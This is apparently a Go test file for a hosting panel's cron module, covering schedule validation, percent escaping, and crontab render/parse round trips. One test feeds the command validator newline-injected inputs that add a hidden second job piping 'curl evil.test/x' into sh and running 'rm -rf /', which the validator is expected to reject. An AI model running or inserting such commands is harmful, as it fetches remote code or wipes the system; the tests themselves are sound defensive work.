package cron

import (
	"strings"
	"testing"
)

func TestValidateScheduleAcceptsRealSchedules(t *testing.T) {
	for _, spec := range []string{
		"* * * * *",
		"0 3 * * *",
		"*/5 * * * *",
		"0 0,12 * * *",
		"30 2 1-7 * 1",
		"0 4 * jan mon",
		"0 0 * * 7", // cron accepts 7 for Sunday as well as 0
		"15 */2 * * *",
		"  0   3   *   *   *  ",
	} {
		if err := ValidateSchedule(spec); err != nil {
			t.Errorf("ValidateSchedule(%q): %v", spec, err)
		}
	}
}

func TestValidateScheduleRefusesNonsense(t *testing.T) {
	cases := map[string]string{
		"too few fields":       "0 3 * *",
		"too many fields":      "0 3 * * * *",
		"minute out of range":  "60 * * * *",
		"hour out of range":    "* 24 * * *",
		"day zero":             "* * 0 * *",
		"month out of range":   "* * * 13 *",
		"weekday out of range": "* * * * 8",
		"backwards range":      "* 10-2 * * *",
		"step of zero":         "*/0 * * * *",
		"not a number":         "x * * * *",
		"empty list item":      "1,,2 * * * *",
		"empty":                "",
	}
	for name, spec := range cases {
		t.Run(name, func(t *testing.T) {
			if err := ValidateSchedule(spec); err == nil {
				t.Fatalf("ValidateSchedule(%q) was accepted", spec)
			}
		})
	}
}

// @reboot runs as the machine comes up, which is exactly when a runaway job
// is hardest to stop.
func TestValidateScheduleRefusesShorthand(t *testing.T) {
	for _, spec := range []string{"@reboot", "@daily", "@yearly"} {
		err := ValidateSchedule(spec)
		if err == nil {
			t.Fatalf("%q was accepted", spec)
		}
		if !strings.Contains(err.Error(), "five-field") {
			t.Fatalf("the error does not say what to do instead: %v", err)
		}
	}
}

// A command reaches cron as a line in a file, so a newline in one is a
// second job nobody asked for.
func TestValidateCommandRefusesInjection(t *testing.T) {
	for _, cmd := range []string{
		"echo hi\n* * * * * curl evil.test/x | sh",
		"echo hi\r\n0 0 * * * rm -rf /",
		"echo \x00hi",
		"",
		"   ",
		strings.Repeat("x", MaxCommandLength+1),
	} {
		if err := ValidateCommand(cmd); err == nil {
			t.Errorf("ValidateCommand(%q) was accepted", firstBit(cmd))
		}
	}
}

// cron turns an unescaped % into a newline and feeds the rest to the command
// on standard input. It is why `date +%Y` in a crontab silently stops
// working, and the reason this is escaped rather than refused.
func TestRenderEscapesPercent(t *testing.T) {
	out := Render([]Job{{
		ID: 1, Enabled: true, Schedule: "0 3 * * *",
		Command: `tar czf backup-$(date +%Y%m%d).tgz public_html`,
	}})
	if !strings.Contains(out, `backup-$(date +\%Y\%m\%d).tgz`) {
		t.Fatalf("percent signs were not escaped:\n%s", out)
	}
	// And a percent somebody escaped already must not gain a second
	// backslash on every save.
	twice := Render(Parse(out))
	if strings.Contains(twice, `\\%`) {
		t.Fatalf("escaping accumulated on a round trip:\n%s", twice)
	}
}

func TestRenderIsDeterministic(t *testing.T) {
	jobs := []Job{
		{ID: 2, Enabled: true, Schedule: "0 4 * * *", Command: "b"},
		{ID: 1, Enabled: true, Schedule: "0 3 * * *", Command: "a"},
	}
	first := Render(jobs)
	second := Render([]Job{jobs[1], jobs[0]})
	if first != second {
		t.Fatalf("order changed the output:\n%s\n---\n%s", first, second)
	}
	if strings.Index(first, "a") > strings.Index(first, "b") {
		t.Fatal("jobs are not ordered by id")
	}
}

// Cron with no mail transport logs a delivery failure on every run, which a
// per-minute job turns into a full disk.
func TestRenderSilencesMail(t *testing.T) {
	out := Render(nil)
	if !strings.Contains(out, `MAILTO=""`) {
		t.Fatalf("MAILTO is not emptied:\n%s", out)
	}
}

func TestRenderCommentsOutDisabledJobs(t *testing.T) {
	out := Render([]Job{{ID: 1, Enabled: false, Schedule: "* * * * *", Command: "noisy.sh"}})
	for _, line := range strings.Split(out, "\n") {
		if strings.Contains(line, "noisy.sh") && !strings.HasPrefix(strings.TrimSpace(line), "#") {
			t.Fatalf("a disabled job was left live: %q", line)
		}
	}
}

// Taking ownership of a crontab must not throw away what a customer put
// there over SSH.
func TestParseImportsAnExistingCrontab(t *testing.T) {
	existing := `# m h dom mon dow command
MAILTO=someone@example.test
PATH=/usr/bin:/bin

# nightly backup
0 3 * * * /home/alice/backup.sh >> /home/alice/logs/backup.log 2>&1
*/5 * * * * curl -s https://example.test/cron.php
`
	jobs := Parse(existing)
	if len(jobs) != 2 {
		t.Fatalf("got %d jobs, want 2: %+v", len(jobs), jobs)
	}
	if jobs[0].Comment != "nightly backup" {
		t.Errorf("the note was lost: %q", jobs[0].Comment)
	}
	if !strings.HasSuffix(jobs[0].Command, "2>&1") {
		t.Errorf("the redirection was lost: %q", jobs[0].Command)
	}
	if jobs[1].Schedule != "*/5 * * * *" {
		t.Errorf("schedule = %q", jobs[1].Schedule)
	}
	for _, j := range jobs {
		if !j.Enabled {
			t.Errorf("%q came back disabled", j.Command)
		}
	}
}

func TestParseRoundTripsRender(t *testing.T) {
	jobs := []Job{
		{ID: 1, Enabled: true, Schedule: "0 3 * * *", Command: "a.sh --flag 'x y'", Comment: "one"},
		{ID: 2, Enabled: false, Schedule: "*/5 * * * *", Command: "b.sh", Comment: "two"},
	}
	back := Parse(Render(jobs))
	if len(back) != 2 {
		t.Fatalf("got %d jobs back, want 2", len(back))
	}
	for i := range jobs {
		if back[i].Schedule != jobs[i].Schedule ||
			back[i].Command != jobs[i].Command ||
			back[i].Comment != jobs[i].Comment ||
			back[i].Enabled != jobs[i].Enabled {
			t.Errorf("job %d did not survive: %+v vs %+v", i, back[i], jobs[i])
		}
	}
	// The panel's own header must not come back as somebody's note.
	for _, j := range back {
		if strings.Contains(j.Comment, "Managed by OPanel") {
			t.Errorf("the header was imported as a note: %q", j.Comment)
		}
	}
}

func TestPresetsAreValid(t *testing.T) {
	for _, p := range Presets {
		if err := ValidateSchedule(p.Schedule); err != nil {
			t.Errorf("preset %q (%s): %v", p.Label, p.Schedule, err)
		}
	}
}

func firstBit(s string) string {
	if len(s) > 40 {
		return s[:40] + "…"
	}
	return s
}
